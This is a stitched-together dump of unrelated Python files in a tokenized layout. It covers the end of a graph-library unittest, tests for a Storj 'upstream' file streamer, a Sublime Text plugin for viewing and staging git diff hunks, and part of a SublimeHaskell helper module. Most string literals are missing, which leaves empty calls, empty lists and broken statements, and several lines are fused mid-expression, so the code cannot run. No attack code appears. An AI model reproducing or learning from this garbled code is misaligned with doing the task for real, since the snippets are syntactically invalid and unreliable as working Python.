self . assertEqual ( "src" , sources [ "default" ] . opname ) \n 
\n 
~~ def test_ports ( self ) : \n 
~~~ g = Graph ( ) \n 
g . add ( Node ( "dim" ) , "dim" ) \n 
g . add ( Node ( "src" ) , "src" ) \n 
g . add ( Node ( "join_detail" ) , "j" ) \n 
\n 
g . connect ( "dim" , "j" , "master" ) \n 
\n 
with self . assertRaises ( GraphError ) : \n 
~~~ g . connect ( "src" , "j" , "master" ) \n 
\n 
~~ g . connect ( "src" , "j" , "detail" ) \n 
\n 
sources = g . sources ( "j" ) \n 
self . assertEqual ( 2 , len ( sources ) ) \n 
self . assertEqual ( [ "detail" , "master" ] , sorted ( sources . keys ( ) ) ) \n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ unittest . main ( ) \n 
#!/usr/bin/env python \n 
# -*- coding: utf-8 -*- \n 
\n 
# The MIT License (MIT) \n 
# \n 
# Copyright (c) 2014 Paul Durivage for Storj Labs \n 
# \n 
# Permission is hereby granted, free of charge, to any person obtaining a copy \n 
# of this software and associated documentation files (the "Software"), to deal \n 
# in the Software without restriction, including without limitation the rights \n 
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell \n 
# copies of the Software, and to permit persons to whom the Software is \n 
# furnished to do so, subject to the following conditions: \n 
# \n 
# The above copyright notice and this permission notice shall be included in \n 
# all copies or substantial portions of the Software. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR \n 
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, \n 
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE \n 
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER \n 
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, \n 
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE \n 
# SOFTWARE. \n 
\n 
~~ import os \n 
import unittest \n 
import mock \n 
\n 
from upstream . shard import Shard \n 
from upstream . streamer import Streamer \n 
from upstream . exc import ConnectError , FileError , ShardError , ResponseError \n 
\n 
\n 
class TestStreamer ( unittest . TestCase ) : \n 
\n 
~~~ def setUp ( self ) : \n 
~~~ self . stream = Streamer ( "http://node1.metadisk.org" ) \n 
self . orig_hash = None \n 
self . uploadfile = "tests/1k.testfile" \n 
self . downloadfile = "download.testfile" \n 
self . shard = Shard ( \n 
"2032e4fd19d4ab49a74ead0984a5f672c26e60da6e992eaf51f05dc874e94bd7" , \n 
"1b1f463cef1807a127af668f3a4fdcc7977c647bf2f357d9fa125f13548b1d14" \n 
) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ del self . stream \n 
del self . orig_hash \n 
del self . uploadfile \n 
try : \n 
~~~ os . remove ( self . downloadfile ) \n 
~~ except : \n 
~~~ pass \n 
~~ try : \n 
~~~ os . remove ( self . shard . filehash ) \n 
~~ except : \n 
~~~ pass \n 
~~ del self . downloadfile \n 
del self . shard \n 
\n 
~~ def test_initialization ( self ) : \n 
~~~ self . assertEqual ( self . stream . server , "http://node1.metadisk.org" ) \n 
\n 
~~ def test_check_connectivity ( self ) : \n 
~~~ def _failing_connection ( ) : \n 
~~~ Streamer ( "http://does.not.exist" ) \n 
\n 
~~ self . assertRaises ( ConnectError , _failing_connection ) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_upload_form_encoded ( self , post ) : \n 
~~~ pass \n 
\n 
~~ @ mock . patch ( ) \n 
def test_upload_sharded_encoded ( self , post ) : \n 
~~~ with self . assertRaises ( NotImplementedError ) : \n 
~~~ self . stream . _upload_sharded_encoded ( , ) \n 
\n 
~~ ~~ @ mock . patch ( ) \n 
def test_filestream ( self , post ) : \n 
~~~ with self . assertRaises ( NotImplementedError ) : \n 
~~~ self . stream . _filestream ( ) \n 
\n 
~~ ~~ def test_upload ( self ) : \n 
# Upload file and check file \n 
~~~ self . shard = self . stream . upload ( self . uploadfile ) \n 
self . assertEqual ( \n 
self . shard . filehash , \n 
"2032e4fd19d4ab49a74ead0984a5f672" \n 
"c26e60da6e992eaf51f05dc874e94bd7" ) \n 
self . assertEqual ( \n 
self . shard . decryptkey , \n 
"1b1f463cef1807a127af668f3a4fdcc7" \n 
"977c647bf2f357d9fa125f13548b1d14" ) \n 
\n 
# Try to upload wrong file \n 
def _failing_upload ( ) : \n 
~~~ self . stream . upload ( "not-a-real-file" ) \n 
~~ self . assertRaises ( FileError , _failing_upload ) \n 
\n 
~~ def test_upload_patched_404 ( self ) : \n 
~~~ self . stream . _upload_form_encoded = mock . MagicMock ( ) \n 
self . stream . _upload_form_encoded . return_value ( ) \n 
self . stream . _upload_form_encoded . return_value . status_code = 404 \n 
\n 
def _fourohfour ( ) : \n 
~~~ self . stream . upload ( self . uploadfile ) \n 
~~ with self . assertRaises ( ResponseError ) as ex : \n 
~~~ _fourohfour ( ) \n 
self . assertEqual ( ex . message , "API call not found." ) \n 
\n 
~~ ~~ def test_upload_patched_402 ( self ) : \n 
~~~ self . stream . _upload_form_encoded = mock . MagicMock ( ) \n 
self . stream . _upload_form_encoded . return_value ( ) \n 
self . stream . _upload_form_encoded . return_value . status_code = 402 \n 
\n 
def _fourohtwo ( ) : \n 
~~~ self . stream . upload ( self . uploadfile ) \n 
~~ with self . assertRaises ( ResponseError ) : \n 
~~~ _fourohtwo ( ) \n 
\n 
~~ ~~ def test_upload_patched_500 ( self ) : \n 
~~~ self . stream . _upload_form_encoded = mock . MagicMock ( ) \n 
self . stream . _upload_form_encoded . return_value ( ) \n 
self . stream . _upload_form_encoded . return_value . status_code = 500 \n 
\n 
def _fivehundred ( ) : \n 
~~~ self . stream . upload ( self . uploadfile ) \n 
~~ with self . assertRaises ( ResponseError ) as ex : \n 
~~~ _fivehundred ( ) \n 
self . assertEqual ( ex . message , "Server error." ) \n 
\n 
~~ ~~ def test_upload_patched_501 ( self ) : \n 
~~~ self . stream . _upload_form_encoded = mock . MagicMock ( ) \n 
self . stream . _upload_form_encoded . return_value ( ) \n 
self . stream . _upload_form_encoded . return_value . status_code = 501 \n 
self . stream . _upload_form_encoded . return_value . reason = "Not Implemented" \n 
\n 
def _fiveohone ( ) : \n 
~~~ self . stream . upload ( self . uploadfile ) \n 
~~ with self . assertRaises ( ResponseError ) as ex : \n 
~~~ _fiveohone ( ) \n 
self . assertEqual ( ex . message , \n 
"Received status code 501 Not Implemented" ) \n 
\n 
~~ ~~ def test_upload_check_path ( self ) : \n 
~~~ homedir = os . path . expanduser ( self . uploadfile ) \n 
result = self . stream . check_path ( self . uploadfile ) \n 
self . assertEqual ( homedir , result ) \n 
\n 
with self . assertRaises ( FileError ) as ex : \n 
~~~ self . stream . check_path ( ) \n 
self . assertEqual ( \n 
ex . message , ) \n 
\n 
~~ ~~ def test_download ( self ) : \n 
~~~ r = self . stream . download ( self . shard ) \n 
self . assertTrue ( r ) \n 
self . assertEquals ( r . status_code , 200 ) \n 
self . assertEqual ( len ( r . content ) , 1024 ) \n 
\n 
~~ def test_download_exception ( self ) : \n 
~~~ self . shard . filehash = self . shard . filehash [ : - 5 ] \n 
with self . assertRaises ( ResponseError ) as ex : \n 
~~~ self . stream . download ( self . shard ) \n 
~~ self . assertEqual ( ex . exception . response . status_code , 404 ) \n 
\n 
~~ def test_download_empty_shard ( self ) : \n 
~~~ shard = Shard ( ) \n 
with self . assertRaises ( ShardError ) as e : \n 
~~~ self . stream . download ( shard ) \n 
~~ self . assertEqual ( str ( e . exception ) , "Shard missing filehash." ) \n 
# coding: utf-8 \n 
~~ ~~ import re \n 
from functools import partial \n 
\n 
import sublime \n 
from sublime_plugin import WindowCommand , TextCommand , EventListener \n 
\n 
from . util import find_view_by_settings , get_setting \n 
from . cmd import GitCmd \n 
from . helpers import GitDiffHelper , GitErrorHelper , GitStatusHelper \n 
\n 
\n 
RE_DIFF_HEAD = re . compile ( ) \n 
\n 
\n 
GIT_DIFF_TITLE = \n 
GIT_DIFF_TITLE_PREFIX = GIT_DIFF_TITLE + \n 
GIT_DIFF_CACHED_TITLE = \n 
GIT_DIFF_CACHED_TITLE_PREFIX = GIT_DIFF_CACHED_TITLE + \n 
\n 
GIT_DIFF_CLEAN = "Nothing to stage (no difference between working tree and index)" \n 
GIT_DIFF_CLEAN_CACHED = "Nothing to unstage (no changes in index)" \n 
\n 
GIT_DIFF_VIEW_SYNTAX = \n 
\n 
GIT_DIFF_UNSTAGE_ERROR = "Cannot unstage hunks which have not been staged." \n 
GIT_DIFF_STAGE_ERROR = "Cannot stage hunks which are already staged." \n 
\n 
\n 
class GitDiffCommand ( WindowCommand , GitCmd ) : \n 
~~~ """\n    Shows a diff of the entire repository in a diff view.\n\n    This diff is between the worktree and the index. Thus, these are the\n    changes that you could ask git to add to the next commit.\n\n    For diff on a single file, either use the **Git: Quick Status** command,\n    or press ``d`` when the cursor is on a file in the status view.\n    """ \n 
\n 
def run ( self , repo = None , path = None , cached = False ) : \n 
~~~ repo = repo or self . get_repo ( ) \n 
if not repo : \n 
~~~ return \n 
\n 
~~ path = path or repo \n 
\n 
title = self . get_view_title ( path , cached ) \n 
git_view = % ( if cached else ) \n 
\n 
view = find_view_by_settings ( self . window , git_view = git_view , git_repo = repo , git_diff_path = path if not view : \n 
~~~ view = self . window . new_file ( ) \n 
view . set_name ( title ) \n 
view . set_syntax_file ( GIT_DIFF_VIEW_SYNTAX ) \n 
view . set_scratch ( True ) \n 
view . set_read_only ( True ) \n 
\n 
view . settings ( ) . set ( , git_view ) \n 
view . settings ( ) . set ( , repo ) \n 
view . settings ( ) . set ( , path ) \n 
view . settings ( ) . set ( , cached ) \n 
view . settings ( ) . set ( , 3 ) \n 
\n 
~~ self . window . focus_view ( view ) \n 
view . run_command ( , { : path , : cached , : True } ) \n 
\n 
~~ def get_view_title ( self , path = None , cached = False ) : \n 
~~~ if cached : \n 
~~~ return GIT_DIFF_CACHED_TITLE_PREFIX + path if path else GIT_DIFF_CACHED_TITLE \n 
~~ else : \n 
~~~ return GIT_DIFF_TITLE_PREFIX + path if path else GIT_DIFF_TITLE \n 
\n 
\n 
~~ ~~ ~~ class GitDiffCachedCommand ( GitDiffCommand ) : \n 
~~~ """\n    Shows the cached diff for the entire repository in a diff view.\n\n    The difference between this command and the **Git: Diff** command is\n    that this command shows the difference between the staged changes (the changes\n    in the index), and the HEAD. I.e. these are changes which you could tell git\n    to unstage.\n\n    For diff on a single file, either use the **Git: Quick Status** command,\n    or press **d** when the cursor is on a file in the status view.\n    """ \n 
\n 
def run ( self , path = None ) : \n 
~~~ super ( GitDiffCachedCommand , self ) . run ( path = path , cached = True ) \n 
\n 
\n 
~~ ~~ class GitDiffCurrentFileCommand ( GitCmd , GitStatusHelper , TextCommand ) : \n 
~~~ """\n    Shows a diff for the current file, if possible.\n    """ \n 
\n 
def run ( self , edit , cached = False ) : \n 
# check if file is saved \n 
~~~ filename = self . view . file_name ( ) \n 
if not filename : \n 
~~~ sublime . error_message ( ) \n 
return \n 
\n 
~~ repo = self . get_repo ( ) \n 
if not repo : \n 
~~~ return \n 
\n 
# check if file is known to git \n 
~~ in_git = self . file_in_git ( repo , filename ) \n 
if not in_git : \n 
~~~ sublime . error_message ( % filename . replace ( repo , ) . return \n 
\n 
~~ self . view . window ( ) . run_command ( , { : repo , : filename , : cached \n 
\n 
~~ ~~ class GitDiffCachedCurrentFileCommand ( GitDiffCurrentFileCommand ) : \n 
~~~ """\n    Shows a cached diff for the current file, if possible.\n    """ \n 
\n 
def run ( self , edit ) : \n 
~~~ super ( GitDiffCachedCurrentFileCommand , self ) . run ( edit , cached = True ) \n 
\n 
\n 
~~ ~~ class GitDiffTextCmd ( GitCmd , GitDiffHelper ) : \n 
\n 
~~~ def move_to_point ( self , point ) : \n 
~~~ self . view . sel ( ) . clear ( ) \n 
self . view . sel ( ) . add ( sublime . Region ( point ) ) \n 
if not self . view . visible_region ( ) . contains ( point ) : \n 
~~~ view = self . view \n 
sublime . set_timeout ( partial ( view . show , point , True ) , 50 ) \n 
\n 
~~ ~~ def parse_diff ( self ) : \n 
~~~ sections = [ ] \n 
state = None \n 
\n 
prev_file = None \n 
current_file = { } \n 
current_hunks = [ ] \n 
\n 
prev_hunk = None \n 
current_hunk = None \n 
\n 
for line in self . view . lines ( sublime . Region ( 0 , self . view . size ( ) ) ) : \n 
~~~ linetext = self . view . substr ( line ) \n 
\n 
if linetext . startswith ( ) : \n 
~~~ state = \n 
# new file starts \n 
if prev_file != line : \n 
~~~ if prev_file is not None : \n 
~~~ if current_hunk : \n 
~~~ current_hunks . append ( current_hunk ) \n 
~~ sections . append ( ( current_file , current_hunks ) ) \n 
~~ prev_file = line \n 
prev_hunk = None \n 
\n 
~~ current_file = line \n 
current_hunks = [ ] \n 
~~ elif state == and RE_DIFF_HEAD . match ( linetext ) : \n 
~~~ current_file = current_file . cover ( line ) \n 
~~ elif linetext . startswith ( ) : \n 
~~~ state = \n 
# new hunk starts \n 
if prev_hunk != line : \n 
~~~ if prev_hunk is not None : \n 
~~~ current_hunks . append ( current_hunk ) \n 
~~ prev_hunk = line \n 
\n 
~~ current_hunk = line \n 
~~ elif state == and linetext [ 0 ] in ( , , ) : \n 
~~~ current_hunk = current_hunk . cover ( line ) \n 
~~ elif state == : \n 
~~~ current_file = current_file . cover ( line ) \n 
\n 
~~ ~~ if current_file and current_hunk : \n 
~~~ current_hunks . append ( current_hunk ) \n 
sections . append ( ( current_file , current_hunks ) ) \n 
~~ return sections \n 
\n 
~~ def build_lookup ( self , parsed_diff ) : \n 
~~~ lookup = [ ] \n 
for header , hunks in parsed_diff : \n 
~~~ for h in hunks : \n 
~~~ lookup . append ( ( h , header ) ) \n 
~~ ~~ return lookup \n 
\n 
~~ def get_hunks_from_selection ( self , selection ) : \n 
~~~ if not selection : \n 
~~~ return None \n 
# parse the diff view \n 
~~ diffspec = self . parse_diff ( ) \n 
lookup = self . build_lookup ( diffspec ) \n 
\n 
# find the applicable hunks \n 
hunks = { } \n 
for s in selection : \n 
~~~ for hunk , header in lookup : \n 
~~~ if s . intersects ( hunk ) or hunk . contains ( s ) or ( s . begin ( ) == self . view . size ( ) and hunk ~~~ hunks . setdefault ( ( header . begin ( ) , header . end ( ) ) , [ ] ) . append ( hunk ) \n 
\n 
~~ ~~ ~~ return hunks \n 
\n 
~~ def create_patch ( self , selected_hunks ) : \n 
~~~ patch = [ ] \n 
for ( hstart , hend ) , hunks in selected_hunks . items ( ) : \n 
~~~ header = sublime . Region ( hstart , hend ) \n 
for head in self . view . lines ( header ) : \n 
~~~ headline = self . view . substr ( head ) \n 
if headline . startswith ( ) or headline . startswith ( ) : \n 
~~~ patch . append ( "%s\\n" % headline . strip ( ) ) \n 
~~ else : \n 
~~~ patch . append ( "%s\\n" % headline ) \n 
~~ ~~ for h in hunks : \n 
~~~ patch . append ( self . view . substr ( self . view . full_line ( h ) ) ) \n 
~~ ~~ return "" . join ( patch ) \n 
\n 
\n 
~~ ~~ class GitDiffRefreshCommand ( TextCommand , GitDiffTextCmd ) : \n 
\n 
~~~ def is_visible ( self ) : \n 
~~~ return False \n 
\n 
~~ def run ( self , edit , path = None , cached = False , run_move = False ) : \n 
~~~ path = path if path else self . view . settings ( ) . get ( ) \n 
cached = cached if cached else self . view . settings ( ) . get ( ) \n 
unified = self . view . settings ( ) . get ( , 3 ) \n 
repo = self . view . settings ( ) . get ( ) \n 
\n 
if path is None or cached is None : \n 
~~~ return \n 
\n 
~~ point = self . view . sel ( ) [ 0 ] . begin ( ) if self . view . sel ( ) else 0 \n 
row , col = self . view . rowcol ( point ) \n 
\n 
diff = self . get_diff ( repo , path , cached , unified = unified ) \n 
clean = False \n 
if not diff : \n 
~~~ diff = GIT_DIFF_CLEAN_CACHED if cached else GIT_DIFF_CLEAN \n 
clean = True \n 
\n 
~~ self . view . settings ( ) . set ( , clean ) \n 
self . view . set_read_only ( False ) \n 
self . view . replace ( edit , sublime . Region ( 0 , self . view . size ( ) ) , diff ) \n 
self . view . set_read_only ( True ) \n 
\n 
if run_move : \n 
~~~ self . view . run_command ( ) \n 
~~ else : \n 
~~~ row_begin = self . view . text_point ( row , 0 ) \n 
line = self . view . line ( row_begin ) \n 
point = self . view . text_point ( row , min ( col , ( line . end ( ) - line . begin ( ) ) ) ) \n 
self . move_to_point ( point ) \n 
\n 
\n 
~~ ~~ ~~ class GitDiffEventListener ( EventListener ) : \n 
\n 
~~~ def on_activated ( self , view ) : \n 
~~~ if view . settings ( ) . get ( ) in ( , ) and get_setting ( ~~~ view . run_command ( ) \n 
\n 
\n 
~~ ~~ ~~ class GitDiffChangeHunkSizeCommand ( TextCommand ) : \n 
\n 
~~~ def is_visible ( self ) : \n 
~~~ return False \n 
\n 
~~ def run ( self , edit , action = ) : \n 
~~~ unified = self . view . settings ( ) . get ( , 3 ) \n 
if action == : \n 
~~~ self . view . settings ( ) . set ( , unified + 1 ) \n 
~~ else : \n 
~~~ self . view . settings ( ) . set ( , max ( 1 , unified - 1 ) ) \n 
~~ self . view . run_command ( ) \n 
\n 
\n 
~~ ~~ class GitDiffMoveCommand ( TextCommand , GitDiffTextCmd ) : \n 
\n 
~~~ def is_visible ( self ) : \n 
~~~ return False \n 
\n 
~~ def run ( self , edit , item = , which = 0 , start = None ) : \n 
# There is nothing to do here \n 
~~~ if self . view . settings ( ) . get ( ) is True : \n 
~~~ return \n 
\n 
~~ if item not in ( , ) : \n 
~~~ return \n 
~~ try : \n 
~~~ which = int ( which ) \n 
~~ except ValueError : \n 
~~~ if which not in ( , , , ) : \n 
~~~ return \n 
\n 
~~ ~~ if start is not None : \n 
~~~ start = int ( start ) \n 
~~ elif self . view . sel ( ) : \n 
~~~ start = self . view . sel ( ) [ 0 ] . begin ( ) \n 
~~ else : \n 
~~~ start = 0 \n 
\n 
~~ file_lookup = self . parse_diff ( ) \n 
hunk_lookup = self . build_lookup ( file_lookup ) \n 
if not hunk_lookup : \n 
~~~ return \n 
\n 
~~ goto = None \n 
if which == : \n 
~~~ goto , _ = hunk_lookup [ 0 ] \n 
~~ elif which == : \n 
~~~ goto , _ = hunk_lookup [ - 1 ] \n 
~~ elif which == : \n 
~~~ if item == : \n 
~~~ next_hunks = [ ( h , f ) for h , f in hunk_lookup if h . begin ( ) > start ] \n 
goto , _ = next_hunks [ 0 ] if next_hunks else hunk_lookup [ - 1 ] \n 
~~ else : \n 
~~~ next_files = [ ( f , h ) for f , h in file_lookup if f . begin ( ) > start ] \n 
goto , _ = next_files [ 0 ] if next_files else file_lookup [ - 1 ] \n 
~~ ~~ elif which == : \n 
~~~ if item == : \n 
~~~ prev_hunks = [ ( h , f ) for h , f in hunk_lookup if h . end ( ) < start ] \n 
goto , _ = prev_hunks [ - 1 ] if prev_hunks else hunk_lookup [ 0 ] \n 
~~ else : \n 
~~~ prev_files = [ ( f , h ) for f , h in file_lookup if h [ - 1 ] . end ( ) < start ] \n 
goto , _ = prev_files [ - 1 ] if prev_files else file_lookup [ 0 ] \n 
~~ ~~ else : \n 
~~~ if item == : \n 
~~~ goto , _ = hunk_lookup [ max ( 0 , which ) ] if which < len ( hunk_lookup ) else hunk_lookup [ - 1 ~~ else : \n 
~~~ goto , _ = file_lookup [ max ( 0 , which ) ] if which < len ( file_lookup ) else file_lookup [ - 1 \n 
~~ ~~ if goto : \n 
~~~ self . move_to_point ( goto . begin ( ) ) \n 
\n 
\n 
~~ ~~ ~~ class GitDiffStageUnstageHunkCommand ( GitDiffTextCmd , GitErrorHelper , TextCommand ) : \n 
\n 
~~~ def is_visible ( self ) : \n 
~~~ return False \n 
\n 
~~ def run ( self , edit , reverse = False ) : \n 
~~~ repo = self . view . settings ( ) . get ( ) \n 
\n 
\n 
if self . view . settings ( ) . get ( ) is not reverse : \n 
~~~ if reverse : \n 
~~~ sublime . error_message ( GIT_DIFF_UNSTAGE_ERROR ) \n 
~~ else : \n 
~~~ sublime . error_message ( GIT_DIFF_STAGE_ERROR ) \n 
~~ return \n 
\n 
# There is nothing to do here \n 
~~ if self . view . settings ( ) . get ( ) is True : \n 
~~~ return \n 
\n 
~~ hunks = self . get_hunks_from_selection ( self . view . sel ( ) ) \n 
if hunks : \n 
~~~ patch = self . create_patch ( hunks ) \n 
cmd = [ , , , if reverse else None , exit , stdout , stderr = self . git ( cmd , stdin = patch , cwd = repo ) \n 
if exit != 0 : \n 
~~~ sublime . error_message ( self . format_error_message ( stderr ) ) \n 
~~ self . view . run_command ( ) \n 
# -*- coding: UTF-8 -*- \n 
\n 
~~ ~~ ~~ import os \n 
import os . path \n 
import sys \n 
import socket \n 
import sublime \n 
import sublime_plugin \n 
import subprocess \n 
import threading \n 
import json \n 
import time \n 
import re \n 
from functools import reduce \n 
\n 
if int ( sublime . version ( ) ) < 3000 : \n 
~~~ import symbols \n 
from sublime_haskell_common import * \n 
~~ else : \n 
~~~ import SublimeHaskell . symbols as symbols \n 
from SublimeHaskell . sublime_haskell_common import * \n 
\n 
~~ def concat_args ( args ) : \n 
~~~ def cat ( x , y ) : \n 
~~~ ( px , ex ) = x \n 
( py , ey ) = y \n 
return ( px or py , ( ex if px else [ ] ) + ( ey if py else [ ] ) ) \n 
~~ return reduce ( cat , args , ( True , [ ] ) ) [ 1 ] \n 
\n 
~~ def concat_opts ( opts ) : \n 
~~~ def cat ( x , y ) : \n 
~~~ ( px , ex ) = x \n 
( py , ey ) = y \n 
v = ( ex if px else { } ) . copy ( ) \n 
v . update ( ( ey if py else { } ) . copy ( ) ) \n 
return ( px or py , v ) \n 
~~ return reduce ( cat , opts , ( True , { } ) ) [ 1 ] \n 
\n 
\n 
~~ def flatten_opts ( opts ) : \n 
~~~ r = [ ] \n 
\n 
def to_opt ( x ) : \n 
~~~ return . format ( x ) \n 
\n 
~~ for k , v in opts . items ( ) : \n 
~~~ if v is None : \n 
~~~ r . append ( to_opt ( k ) ) \n 
~~ elif type ( v ) is list : \n 
~~~ for n in v : \n 
~~~ r . extend ( [ to_opt ( k ) , str ( n ) ] ) \n 
~~ ~~ else : \n 
~~~ r . extend ( [ to_opt ( k ) , str ( v ) ] ) \n 
\n 
~~ ~~ return r \n 
\n 
~~ def hsdev_enabled ( ) : \n 
~~~ return get_setting_async ( ) == True \n 
\n 
~~ def hsdev_enable ( enable = True ) : \n 
~~~ set_setting_async ( , enable ) \n 
\n 
~~ def hsdev_version ( ) : \n 
~~~ try : \n 
~~~ ( exit_code , out , err ) = call_and_wait ( [ , ] ) \n 
if exit_code == 0 : \n 
~~~ m = re . match ( , out ) \n 
if m : \n 
~~~ major = int ( m . group ( ) ) \n 
minor = int ( m . group ( ) ) \n 
revision = int ( m . group ( ) ) \n 
build = int ( m . group ( ) ) \n 
return [ major , minor , revision , build ] \n 
~~ ~~ ~~ except FileNotFoundError : \n 
~~~ pass \n 
~~ return None \n 
\n 
~~ def show_version ( ver ) : \n 
~~~ return . join ( map ( lambda i : str ( i ) , ver ) ) \n 
\n 
~~ def check_version ( ver , minimal = [ 0 , 0 , 0 , 0 ] , maximal = None ) : \n 
~~~ if ver is None : \n 
~~~ return False \n 
~~ if ver < minimal : \n 
~~~ return False \n 
~~ if maximal and ver >= maximal : \n 
~~~ return False \n 
~~ return True \n 
\n 
~~ def if_some ( x , lst ) : \n 
~~~ return lst if x is not None else [ ] \n 
\n 
~~ def cabal_path ( cabal ) : \n 
~~~ if not cabal : \n 
~~~ return [ ] \n 
~~ return [ "--cabal" ] if cabal == else [ "--sandbox={0}" . format ( cabal ) ] \n 
\n 
~~ def hsinspect ( module = None , file = None , cabal = None , ghc_opts = [ ] ) : \n 
~~~ cmd = [ ] \n 
on_result = lambda s : s \n 
if module : \n 
~~~ cmd . extend ( [ module ] ) \n 
on_result = parse_module \n 
~~ elif file : \n 
~~~ cmd . extend ( [ file ] ) \n 
on_result = parse_module \n 
~~ elif cabal : \n 
~~~ cmd . extend ( [ cabal ] ) \n 
~~ else : \n 
~~~ log ( , log_debug ) \n 
return None \n 
\n 
~~ for opt in ghc_opts : \n 
~~~ cmd . extend ( [ , opt ] ) \n 
\n 
~~ r = call_and_wait_tool ( cmd , , lambda s : json . loads ( s ) , file , None ) \n 
if r : \n 
~~~ if in r : \n 
~~~ log ( . format ( r [ ] ) , log_error ) \n 
~~ else : \n 
~~~ return on_result ( r ) \n 
~~ ~~ return None \n 
\n 
~~ def print_status ( s ) : \n 
~~~ print ( s [ ] ) \n 
\n 
~~ def parse_database ( s ) : \n 
~~~ if not s : \n 
~~~ return None \n 
~~ if s and in s and in s : \n 
~~~ return ( s [ ] , [ parse_module ( m ) for m in s [ ] ] ) \n 
~~ return None \n 
\n 
~~ def parse_decls ( s ) : \n 
~~~ if s is None : \n 
~~~ return None \n 
~~ return [ parse_module_declaration ( decl ) for decl in s ] \n 
\n 
~~ def parse_modules_brief ( s ) : \n 
~~~ if s is None : \n 
~~~ return None \n 
~~ return [ parse_module_id ( m ) for m in s ] \n 
\n 
~~ def get_value ( dc , ks , defval = None ) : \n 
~~~ if dc is None : \n 
~~~ return defval \n 
~~ if type ( ks ) == list : \n 
~~~ cur = dc \n 
for k in ks : \n 
~~~ cur = cur . get ( k ) \n 
if cur is None : \n 
~~~ return defval \n 
~~ ~~ return cur \n 
~~ else : \n 
~~~ return dc . get ( ks , defval ) \n 
\n 
\n 
~~ ~~ def parse_package_db ( d , defval = None ) : \n 
~~~ if type ( d ) == dict : \n 
~~~ pdb = get_value ( d , ) \n 
return symbols . PackageDb ( package_db = pdb ) if pdb else defval \n 
~~ if d == : \n 
~~~ return symbols . PackageDb ( global_db = True ) \n 
~~ if d == : \n 
~~~ return symbols . PackageDb ( user_db = True ) \n 
~~ return defval \n 
\n 
~~ def parse_position ( d ) : \n 
~~~ if not d : \n 
~~~ return None \n 
~~ line = get_value ( d , ) \n 
column = get_value ( d , ) \n 
if line is not None and column is not None : \n 
~~~ return symbols . Position ( line , column ) \n 
~~ return None \n 
\n 
~~ def parse_location ( d ) : \n 
~~~ loc = symbols . Location ( \n 
get_value ( d , ) , \n 
get_value ( d , ) ) \n 
if not loc . is_null ( ) : \n 
~~~ return loc \n 
~~ loc = symbols . InstalledLocation ( \n 
symbols . parse_package ( get_value ( d , ) ) , \n 
parse_package_db ( get_value ( d , ) ) ) \n 
if not loc . is_null ( ) : \n 
~~~ return loc \n 
~~ loc = symbols . OtherLocation ( \n 
get_value ( d , ) ) \n 
if not loc . is_null ( ) : \n 
~~~ return loc \n 
~~ return None \n 
\n 
~~ def parse_import ( d ) : \n 
~~~ if not d : \n 
~~~ return None \n 
~~ return symbols . Import ( d [ ] , d [ ] , d . get ( ) , parse_position ( d . get ( ) ) ) \n 
\n 
~~ def parse_module_id ( d ) : \n 
~~~ if d is None : \n 
~~~ return None \n 
~~ return symbols . Module ( \n 
d [ ] , \n 
[ ] , [ ] , { } , \n 
parse_location ( d . get ( ) ) ) \n 
\n 
~~ def parse_declaration ( decl ) : \n 
~~~ try : \n 
~~~ what = decl [ ] [ ] \n 
docs = crlf2lf ( decl . get ( ) ) \n 
name = decl [ ] \n 
pos = parse_position ( decl . get ( ) ) \n 
imported = [ ] \n 
if in decl and decl [ ] : \n 
~~~ imported = [ parse_import ( d ) for d in decl [ ] ] \n 
~~ defined = None \n 
if in decl and decl [ ] : \n 
~~~ defined = parse_module_id ( decl [ ] ) \n 
\n 
~~ if what == : \n 
~~~ return symbols . Function ( name , decl [ ] . get ( ) , docs , imported , defined , pos ) \n 
~~ elif what == : \n 
~~~ return symbols . Type ( name , decl [ ] [ ] . get ( ) , decl [ ] [ ] . get ( ~~ elif what == : \n 
~~~ return symbols . Newtype ( name , decl [ ] [ ] . get ( ) , decl [ ] [ ] . get ( ~~ elif what == : \n 
~~~ return symbols . Data ( name , decl [ ] [ ] . get ( ) , decl [ ] [ ] . get ( ~~ elif what == : \n 
~~~ return symbols . Class ( name , decl [ ] [ ] . get ( ) , decl [ ] [ ] . get ( ~~ else : \n 
~~~ return None \n 
~~ ~~ except Exception as e : \n 
~~~ log ( . format ( e ) , log_error ) \n 
return None \n 
\n 
~~ ~~ def parse_declarations ( decls ) : \n 
~~~ if decls is None : \n 
~~~ return None \n 
~~ return [ parse_declaration ( d ) for d in decls ] \n 
\n 
~~ def parse_module_declaration ( d , parse_module_info = True ) : \n 
~~~ try : \n 
~~~ m = None \n 
if in d and parse_module_info : \n 
~~~ m = parse_module_id ( d [ ] ) \n 
\n 
~~ loc = parse_location ( d [ ] . get ( ) ) \n 
decl = parse_declaration ( d [ ] ) \n 
\n 
if not decl : \n 
~~~ return None \n 
\n 
~~ decl . module = m \n 
\n 
return decl \n 
~~ except : \n 
~~~ return None \n 
\n 
~~ ~~ def parse_module ( d ) : \n 
~~~ if d is None : \n 
~~~ return None \n 
~~ return symbols . Module ( \n 
d [ ] , \n 
d . get ( ) , \n 
[ parse_import ( i ) for i in d [ ] ] if in d else [ ] , \n 
dict ( ( decl [ ] , parse_declaration ( decl ) ) for decl in d [ ] ) if parse_location ( d . get ( ) ) ) \n 
\n 
~~ def parse_modules ( ds ) : \n 
~~~ if ds is None : \n 
~~~ return None \n 
~~ return [ parse_module ( d ) for d in ds ] \n 
\n 
~~ def parse_cabal_package ( d ) : \n 
~~~ if d is None : \n 
~~~ return None \n 
~~ return symbols . CabalPackage ( \n 
d [ ] , \n 
d . get ( ) , \n 
d . get ( ) , \n 
d . get ( ) , \n 
d . get ( ) , \n 
d . get ( ) ) \n 
\n 
~~ def parse_corrections ( d ) : \n 
~~~ if d is None : \n 
~~~ return None \n 
~~ return [ parse_correction ( c ) for c in d ] \n 
\n 
